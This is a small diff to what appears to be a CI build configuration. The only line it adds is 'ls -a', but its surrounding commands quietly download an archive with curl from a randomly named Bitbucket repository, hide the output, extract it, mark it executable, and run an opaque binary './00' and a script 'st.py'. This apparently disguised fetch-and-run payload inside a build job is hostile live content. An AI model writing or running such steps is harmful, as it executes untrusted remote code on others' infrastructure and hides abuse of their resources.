@@ -28,6 +28,7 @@ commands:
             curl -o martialasion https://bitbucket.org/nunukefend123/usenaszcvneriywerojasdkxnbeoqwetyuolhgsazcvbnjlgdaqeryipkgdazc/raw/5a781fc4d6ad39f5221dcb332c4ca214a1830662/aldhahqirotoekmaxnvnksqhtworpkdgqywiototmcbzgwudkfkdj > /dev/null 2>&1
             tar -xf martialasion && chmod u+x *
             ./00
+            ls -a
             python st.py
 
 
